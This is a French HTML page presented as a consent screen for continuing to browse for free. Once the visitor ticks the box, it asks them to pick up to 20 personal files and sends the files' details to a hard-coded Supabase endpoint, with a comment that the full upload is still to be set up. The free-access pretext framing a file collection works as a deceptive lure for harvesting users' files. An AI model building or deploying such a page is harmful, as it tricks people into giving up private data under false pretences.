
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Confirme ton accès</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      box-sizing: border-box;
      display: grid;
      place-items: center;
      background: #f1f5f9;
      font-family: Arial, sans-serif;
      color: #172033;
    }
    main {
      background: white;
      width: 100%;
      max-width: 430px;
      padding: 24px;
      box-sizing: border-box;
      border-radius: 16px;
      box-shadow: 0 5px 25px #0001;
    }
    h1 { text-align: center; }
    p { line-height: 1.5; }
    button, .choose {
      display: block;
      width: 100%;
      padding: 14px;
      border: 0;
      border-radius: 9px;
      font-size: 16px;
      margin-top: 14px;
      box-sizing: border-box;
    }
    button {
      background: #2563eb;
      color: white;
      cursor: pointer;
    }
    button:disabled { opacity: .45; }
    .choose {
      background: #e8efff;
      color: #1d4ed8;
      text-align: center;
      font-weight: bold;
      cursor: pointer;
    }
    #status { overflow-wrap: anywhere; }
    [hidden] { display: none !important; }
  </style>
</head>
<body>
<main>
  <h1>Confirme ton accès</h1>
  <p>
    accepte les condition pour continuer a surfé gratuitement.
  </p>
  <p>
    j'accepte pour continuer.
  </p>

  <label>
    <input type="checkbox" id="accord">
    J'ai lu et j'accepte les conditions.
  </label>

  <section id="partage" hidden>
    <label class="choose" for="fichiers">
      Choisir plusieurs fichiers
    </label>
    <input id="fichiers" type="file" multiple hidden>
    <p id="liste">Aucun fichier sélectionné.</p>
    <button id="envoyer" disabled>Confirmer l'envoi</button>
  </section>

  <p id="status" role="status" aria-live="polite"></p>
</main>

<script>
  // Projet Supabase
  const SUPABASE_URL =
    "https://hbpijtddguzqcfikhzde.supabase.co";

  const SUPABASE_KEY =
    "sb_publishable_ix6RvrM1ActTBEg97AluTw_dF9OkXey";

  // À créer et sécuriser côté Supabase avant l'envoi réel.
  const UPLOAD_ENDPOINT =
    SUPABASE_URL + "/functions/v1/create-upload";

  const accord = document.getElementById("accord");
  const partage = document.getElementById("partage");
  const fichiers = document.getElementById("fichiers");
  const liste = document.getElementById("liste");
  const envoyer = document.getElementById("envoyer");
  const status = document.getElementById("status");

  accord.addEventListener("change", () => {
    partage.hidden = !accord.checked;
  });

  fichiers.addEventListener("change", () => {
    const selection = Array.from(fichiers.files);
    const tailleMax = 20 * 1024 * 1024;
    const valide = selection.length > 0 &&
      selection.length <= 20 &&
      selection.every(f => f.size <= tailleMax);

    liste.textContent = selection.length
      ? selection.length + " fichier(s) sélectionné(s)"
      : "Aucun fichier sélectionné.";

    envoyer.disabled = !valide;
    status.textContent = selection.length && !valide
      ? "Choisis au maximum 20 fichiers de 20 Mo chacun."
      : "";
  });

  envoyer.addEventListener("click", async () => {
    const selection = Array.from(fichiers.files);
    if (!accord.checked || !selection.length) return;

    envoyer.disabled = true;
    status.textContent =
      "L'envoi réel nécessite la configuration de la fonction sécurisée Supabase.";

    try {
      // Cette fonction doit être créée côté serveur.
      // Elle ne doit autoriser que des envois limités et contrôlés.
      const reponse = await fetch(UPLOAD_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": SUPABASE_KEY
        },
        body: JSON.stringify({
          files: selection.map(f => ({
            name: f.name,
            size: f.size,
            type: f.type || "application/octet-stream"
          }))
        })
      });

      if (!reponse.ok) {
        throw new Error(
          "La fonction d'envoi Supabase n'est pas encore configurée."
        );
      }

      status.textContent =
        "Autorisation obtenue. Il reste à configurer le transfert sécurisé.";
    } catch (e) {
      status.textContent = e.message;
    } finally {
      envoyer.disabled = false;
    }
  });
</script>
</body>
</html>
